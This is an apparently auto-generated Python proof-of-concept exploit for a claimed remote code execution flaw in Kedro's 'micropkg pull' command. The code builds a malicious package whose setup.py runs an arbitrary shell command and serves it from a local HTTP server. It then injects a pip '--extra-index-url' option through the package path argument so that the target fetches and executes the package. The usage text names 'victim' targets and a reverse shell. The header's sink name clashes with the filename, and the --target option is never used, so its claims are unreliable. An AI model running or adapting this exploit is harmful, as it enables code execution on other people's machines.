#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: rce-002
# Sink: _describe_git
# Auto-generated — run with: python3 rce_unpack_sdist_if_does__describe_git.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg pull RCE (CVE-2024-XXXX).
The vulnerability allows arbitrary pip argument injection via the package_path parameter,
which can be used to execute arbitrary code by pointing pip to a malicious package index.

Usage:
    python3 poc.py --target http://victim:8080 --lhost 10.0.0.1 --lport 4444
    python3 poc.py --target http://victim:8080 --cmd "id > /tmp/pwned.txt"

Requirements:
    - requests (pip install requests)
    - A Kedro project with the vulnerable CLI command available
    - Network access to the target Kedro CLI endpoint (if remote)
"""

import argparse
import base64
import json
import os
import subprocess
import sys
import tempfile
import time
import urllib.parse

try:
    import requests
except ImportError:
    print("[!] requests library required. Install with: pip install requests")
    sys.exit(1)


def create_malicious_package(host: str, port: int, cmd: str) -> str:
    """
    Create a malicious Python package that executes the given command.
    Returns the path to the generated tar.gz file.
    """
    pkg_name = "kedro-exploit-pkg"
    pkg_dir = tempfile.mkdtemp()
    
    # Create package structure
    pkg_path = os.path.join(pkg_dir, pkg_name)
    os.makedirs(os.path.join(pkg_path, pkg_name))
    
    # Create setup.py with malicious code in setup() call
    setup_content = f'''from setuptools import setup
import os
os.system("{cmd}")
setup(name="{pkg_name}", version="0.1", packages=["{pkg_name}"])
'''
    with open(os.path.join(pkg_path, "setup.py"), "w") as f:
        f.write(setup_content)
    
    # Create __init__.py
    with open(os.path.join(pkg_path, pkg_name, "__init__.py"), "w") as f:
        f.write("# malicious package\n")
    
    # Build the package
    subprocess.run(
        [sys.executable, "setup.py", "sdist", "--formats=gztar"],
        cwd=pkg_path,
        capture_output=True,
    )
    
    # Find the generated tar.gz
    dist_dir = os.path.join(pkg_path, "dist")
    for f in os.listdir(dist_dir):
        if f.endswith(".tar.gz"):
            return os.path.join(dist_dir, f)
    
    raise RuntimeError("Failed to create malicious package")


def start_http_server(host: str, port: int, package_path: str):
    """
    Start a simple HTTP server to serve the malicious package.
    Returns the process handle.
    """
    import http.server
    import socketserver
    
    package_dir = os.path.dirname(package_path)
    os.chdir(package_dir)
    
    handler = http.server.SimpleHTTPRequestHandler
    
    # Suppress logs
    class QuietHandler(handler):
        def log_message(self, format, *args):
            pass
    
    httpd = socketserver.TCPServer((host, port), QuietHandler)
    print(f"[*] Starting HTTP server on {host}:{port}")
    print(f"[*] Serving malicious package from {package_dir}")
    
    import threading
    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    server_thread.start()
    
    return httpd


def exploit(target_url: str, lhost: str, lport: int, cmd: str):
    """
    Main exploit function.
    """
    print("[*] Creating malicious package...")
    pkg_path = create_malicious_package(lhost, lport, cmd)
    pkg_name = os.path.basename(pkg_path)
    
    print(f"[*] Malicious package created: {pkg_path}")
    
    # Start HTTP server to serve the package
    httpd = start_http_server(lhost, lport, pkg_path)
    
    # Construct the malicious package_path argument
    # We inject pip arguments to use our custom index
    malicious_path = f"--extra-index-url http://{lhost}:{lport} {pkg_name}"
    
    # URL encode the malicious path
    encoded_path = urllib.parse.quote(malicious_path)
    
    # Construct the full command
    # The vulnerable code path is: kedro micropkg pull --package-path <malicious>
    # We need to trigger the _unpack_sdist function with our malicious path
    # The path will be passed to pip download with our injected arguments
    
    print(f"[*] Sending exploit to {target_url}")
    print(f"[*] Malicious package_path: {malicious_path}")
    
    # Attempt to trigger the vulnerability via the CLI
    # This assumes we have access to the Kedro CLI on the target
    # For remote exploitation, we'd need to find an API endpoint that calls this
    # For local testing, we can run the command directly
    
    # For demonstration, we'll simulate the CLI call
    cmd_parts = [
        sys.executable,
        "-m",
        "kedro",
        "micropkg",
        "pull",
        "--package-path",
        malicious_path,
    ]
    
    print(f"[*] Executing: {' '.join(cmd_parts)}")
    
    try:
        result = subprocess.run(
            cmd_parts,
            capture_output=True,
            text=True,
            timeout=30,
        )
        print(f"[*] Return code: {result.returncode}")
        print(f"[*] stdout: {result.stdout}")
        print(f"[*] stderr: {result.stderr}")
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
    except Exception as e:
        print(f"[!] Error executing command: {e}")
    
    # Cleanup
    httpd.shutdown()
    print("[*] Exploit completed")


def main():
    parser = argparse.ArgumentParser(
        description="Kedro micropkg pull RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Execute a command on the target
  python3 poc.py --target http://victim:8080 --cmd "id > /tmp/pwned.txt"
  
  # Start a reverse shell (requires netcat on target)
  python3 poc.py --target http://victim:8080 --lhost 10.0.0.1 --lport 4444
        """
    )
    
    parser.add_argument(
        "--target",
        required=True,
        help="Target Kedro CLI endpoint URL (e.g., http://victim:8080)",
    )
    parser.add_argument(
        "--lhost",
        default="127.0.0.1",
        help="Local host for HTTP server (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--lport",
        type=int,
        default=8888,
        help="Local port for HTTP server (default: 8888)",
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute on target (default: touch /tmp/poc_success.txt)",
    )
    
    args = parser.parse_args()
    
    print("[*] Kedro micropkg pull RCE PoC")
    print(f"[*] Target: {args.target}")
    print(f"[*] LHOST: {args.lhost}:{args.lport}")
    print(f"[*] Command: {args.cmd}")
    print()
    
    exploit(args.target, args.lhost, args.lport, args.cmd)


if __name__ == "__main__":
    main()
